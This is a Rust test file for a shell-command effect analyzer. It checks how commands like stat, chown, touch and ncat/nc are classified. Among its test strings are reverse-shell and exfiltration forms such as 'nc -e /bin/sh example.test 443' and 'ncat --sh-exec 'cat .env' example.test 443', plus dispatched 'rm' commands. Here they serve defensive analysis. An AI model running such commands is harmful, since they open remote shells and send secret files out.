use caushell_parse::parse_command;
use caushell_profile::*;
use caushell_types::{ShellKind, StreamDataDependency};
use std::sync::OnceLock;

fn resolved(command: &str) -> ResolvedInvocationArtifact {
    static REGISTRY: OnceLock<ProfileRegistry> = OnceLock::new();
    let parsed = parse_command(command, ShellKind::Bash).unwrap();
    match resolve_invocation_artifact_with_bindings(
        REGISTRY.get_or_init(|| ProfileRegistry::built_in().unwrap()),
        &parsed.commands[0],
        InvocationRuntimeContext::new(),
        &SessionBindings::new(),
    ) {
        ResolveInvocationArtifactResult::Resolved(r) => r,
        other => panic!("{command}: {other:#?}"),
    }
}

fn known(command: &str) -> ResolvedInvocationArtifact {
    let r = resolved(command);
    assert!(!r.bound.operation_semantics_unresolved, "{command}: {r:#?}");
    assert!(r.bound.residuals.is_empty(), "{command}: {r:#?}");
    assert!(r.proven_stream_contract().is_some(), "{command}: {r:#?}");
    r
}

#[test]
fn information_modes_do_not_emit_mutation_or_dispatch_effects() {
    for command in [
        "touch --help /opt/shared/file",
        "touch --version /opt/shared/file",
        "chown --help root /opt/shared/file",
        "chown --reference=.env --help /opt/shared/file",
        "chgrp --version root /opt/shared/file",
        "chgrp --reference=.env --help /opt/shared/file",
        "stat --help .env",
        "ls --help .env",
        "du --help .env",
        "readlink --help .env",
        "realpath --version .env",
        "ncat --help --sh-exec 'rm /opt/shared/file' example.test 443",
        "nc --help -e /bin/sh example.test 443",
    ] {
        let r = known(command);
        assert!(
            r.bound.effects.is_empty(),
            "{command}: {:?}",
            r.bound.effects
        );
        let stream = r.proven_stream_contract().unwrap();
        assert_eq!(stream.stdin_mode, StreamInputMode::Ignored, "{command}");
        assert_eq!(
            stream.stdout_dependency,
            StreamDataDependency::Independent,
            "{command}"
        );
    }
}

#[test]
fn metadata_reads_are_targets_not_opened_file_bytes() {
    for command in [
        "stat -c %a .env",
        "stat --printf=%a .env",
        "stat --cached=never -L .env",
        "ls -d .env",
        "ls -1 --color=never .env",
        "du -sh .env",
        "readlink -m .env",
        "realpath -m --relative-to=cache .env",
        "touch -r .env cache/file",
        "chown --reference=.env cache/file",
        "chgrp --reference=.env cache/file",
    ] {
        let r = known(command);
        assert!(
            r.bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::TargetPath),
            "{command}"
        );
        assert!(
            !r.bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::ReadPath),
            "{command}"
        );
        assert_eq!(
            r.proven_stream_contract().unwrap().stdin_mode,
            StreamInputMode::Ignored,
            "{command}"
        );
    }
}

#[test]
fn native_metadata_mutations_keep_actual_effects() {
    for (command, effect) in [
        ("touch -am -d now cache/file", EffectKind::WritePath),
        (
            "chown -R root:staff cache/file",
            EffectKind::MetadataMutation,
        ),
        (
            "chown --reference=.env cache/file",
            EffectKind::MetadataMutation,
        ),
        ("chgrp -R staff cache/file", EffectKind::ChangeGroup),
        ("chgrp --reference=.env cache/file", EffectKind::ChangeGroup),
    ] {
        let r = known(command);
        assert!(
            r.bound.effects.iter().any(|e| e.kind == effect),
            "{command}"
        );
        assert_eq!(
            r.proven_stream_contract().unwrap().stdout_dependency,
            StreamDataDependency::Independent,
            "{command}"
        );
    }
}

#[test]
fn ncat_network_modes_have_correct_stdin_and_native_stdout() {
    for command in [
        "ncat example.test 443",
        "nc example.test 443",
        "nc -l 127.0.0.1 8765",
    ] {
        let r = known(command);
        assert!(
            r.bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::ConsumeStdin),
            "{command}"
        );
        assert_eq!(
            r.proven_stream_contract().unwrap().stdin_mode,
            StreamInputMode::DataOptional,
            "{command}"
        );
    }
    for command in [
        "ncat --recv-only example.test 443",
        "nc -d example.test 443",
        "nc -z example.test 443",
    ] {
        let r = known(command);
        assert!(
            !r.bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::ConsumeStdin),
            "{command}"
        );
        assert_eq!(
            r.proven_stream_contract().unwrap().stdin_mode,
            StreamInputMode::Ignored,
            "{command}"
        );
    }
    for command in [
        "ncat --send-only example.test 443",
        "ncat --exec '/bin/cat .env' example.test 443",
        "ncat --sh-exec 'cat .env' example.test 443",
    ] {
        let r = known(command);
        assert_eq!(
            r.proven_stream_contract().unwrap().stdout_dependency,
            StreamDataDependency::Independent,
            "{command}"
        );
    }
}

#[test]
fn ncat_declares_listeners_logs_and_separate_exec_grammars() {
    for command in [
        "ncat -l",
        "ncat -l 8765",
        "ncat -l 127.0.0.1 8765",
        "ncat -l -p 8765",
        "ncat -l -p 8765 127.0.0.1",
        "ncat --send-only -l -p 8765 127.0.0.1",
        "ncat -U -l cache/socket",
        "nc -l 8765",
        "nc -dl 127.0.0.1 8765",
    ] {
        let r = known(command);
        assert!(
            r.bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::ListenNetwork),
            "{command}"
        );
    }
    for command in [
        "ncat -o cache/log example.test 443",
        "ncat --append-output --output=cache/log example.test 443",
        "ncat --hex-dump cache/hex example.test 443",
    ] {
        let r = known(command);
        assert!(
            r.bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::WritePath),
            "{command}"
        );
    }
    for command in [
        "ncat --exec '/bin/rm /opt/shared/file' example.test 443",
        "ncat --sh-exec 'printf PUBLIC; rm /opt/shared/file' example.test 443",
    ] {
        assert!(
            known(command)
                .bound
                .effects
                .iter()
                .any(|e| e.kind == EffectKind::DispatchCommand),
            "{command}"
        );
    }
    for command in [
        "nc -e /bin/sh example.test 443",
        "nc -c example.test 443",
        "ncat --lua-exec cache/program.lua example.test 443",
        "ncat -Uu cache/socket",
    ] {
        assert!(
            resolved(command).bound.operation_semantics_unresolved,
            "{command}"
        );
    }
}
